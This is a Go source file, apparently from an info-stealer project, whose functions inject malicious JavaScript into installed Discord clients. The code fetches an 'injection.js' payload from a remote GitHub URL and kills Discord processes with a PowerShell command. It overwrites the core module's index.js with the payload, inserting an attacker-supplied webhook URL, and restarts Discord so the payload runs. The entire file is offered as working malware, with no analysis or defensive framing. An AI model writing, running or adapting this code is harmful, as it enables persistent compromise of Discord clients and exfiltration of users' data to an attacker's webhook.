package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
)

// Inject downloads the injection script, kills any running Discord processes via PowerShell,
// injects the code into Discord’s core, and restarts Discord. The provided webhook URL is
// inserted into the injection code.
func InjectDiscord(webhook string) error {
	// Get LOCALAPPDATA and build list of possible Discord directories.
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return fmt.Errorf("LOCALAPPDATA environment variable not set")
	}
	discordDirs := []string{
		filepath.Join(localAppData, "Discord"),
		filepath.Join(localAppData, "DiscordCanary"),
		filepath.Join(localAppData, "DiscordPTB"),
		filepath.Join(localAppData, "DiscordDevelopment"),
	}

	// Download the injection JavaScript code.
	url := "https://raw.githubusercontent.com/greenstorm5417/BitThief/refs/heads/main/injection/injection.js"
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download injection code: %w", err)
	}
	defer resp.Body.Close()

	codeBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read injection code: %w", err)
	}
	code := string(codeBytes)

	// Kill all processes with "discord" in their name using PowerShell.
	// The command lists processes whose ProcessName matches "*discord*" and forcefully stops them.
	psCmd := `Get-Process | Where-Object {$_.ProcessName -like '*discord*'} | Stop-Process -Force`
	killCmd := exec.Command("powershell", "-Command", psCmd)
	// We ignore any error (for example, if no matching processes are found).
	_ = killCmd.Run()

	// Iterate over each potential Discord installation directory.
	for _, dir := range discordDirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			continue
		}

		corePath, version, err := getCore(dir)
		if err != nil || corePath == "" {
			// Skip this directory if the core wasn’t found.
			continue
		}

		// Replace the placeholder text in the injection code.
		// "discord_desktop_core-1" is replaced with the actual version (the module folder name)
		// and "%WEBHOOK%" is replaced with the provided webhook URL.
		modifiedCode := strings.ReplaceAll(code, "discord_desktop_core-1", version)
		modifiedCode = strings.ReplaceAll(modifiedCode, "%WEBHOOK%", webhook)

		indexPath := filepath.Join(corePath, "index.js")
		if err := os.WriteFile(indexPath, []byte(modifiedCode), 0644); err != nil {
			// If writing fails, skip to the next directory.
			continue
		}

		// Restart Discord using the Update.exe mechanism.
		if err := startDiscord(dir); err != nil {
			// If restarting fails, continue on to the next directory.
			continue
		}
	}

	return nil
}

// getCore searches for a Discord "core" folder inside the provided directory.
// It looks for a subdirectory starting with "app-" and then inside its "modules" folder
// for a directory beginning with "discord_desktop_core". If found, it returns the full path
// to the "discord_desktop_core" folder and the module folder name (which is used as the version).
func getCore(dir string) (string, string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", "", err
	}

	for _, entry := range entries {
		// Look for directories whose name starts with "app-"
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "app-") {
			appDir := filepath.Join(dir, entry.Name())
			modulesDir := filepath.Join(appDir, "modules")
			if _, err := os.Stat(modulesDir); err != nil {
				continue
			}

			modEntries, err := os.ReadDir(modulesDir)
			if err != nil {
				continue
			}

			re := regexp.MustCompile("^discord_desktop_core")
			for _, modEntry := range modEntries {
				// Look for a module whose name starts with "discord_desktop_core".
				if !re.MatchString(modEntry.Name()) {
					continue
				}

				corePath := filepath.Join(modulesDir, modEntry.Name(), "discord_desktop_core")
				indexPath := filepath.Join(corePath, "index.js")
				if _, err := os.Stat(indexPath); err != nil {
					continue
				}

				return corePath, modEntry.Name(), nil
			}
		}
	}

	// If not found, return an empty result.
	return "", "", nil
}

// startDiscord attempts to restart Discord from the specified directory.
// It looks for a subfolder starting with "app-" that contains the Discord executable,
// then calls Update.exe with the "--processStart" argument to restart it.
func startDiscord(dir string) error {
	updatePath := filepath.Join(dir, "Update.exe")
	// The executable name is derived from the Discord folder name (e.g. "Discord.exe").
	exeName := filepath.Base(dir) + ".exe"

	entries, err := os.ReadDir(dir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		// Look for directories that start with "app-"
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "app-") {
			appDir := filepath.Join(dir, entry.Name())
			modulesPath := filepath.Join(appDir, "modules")
			if _, err := os.Stat(modulesPath); err != nil {
				continue
			}

			// Look for the Discord executable within the app folder.
			appEntries, err := os.ReadDir(appDir)
			if err != nil {
				continue
			}

			for _, appEntry := range appEntries {
				if !appEntry.IsDir() && appEntry.Name() == exeName {
					executable := filepath.Join(appDir, exeName)
					// Call Update.exe with "--processStart" and the path to the executable.
					cmd := exec.Command(updatePath, "--processStart", executable)
					return cmd.Run()
				}
			}
		}
	}

	return nil
}
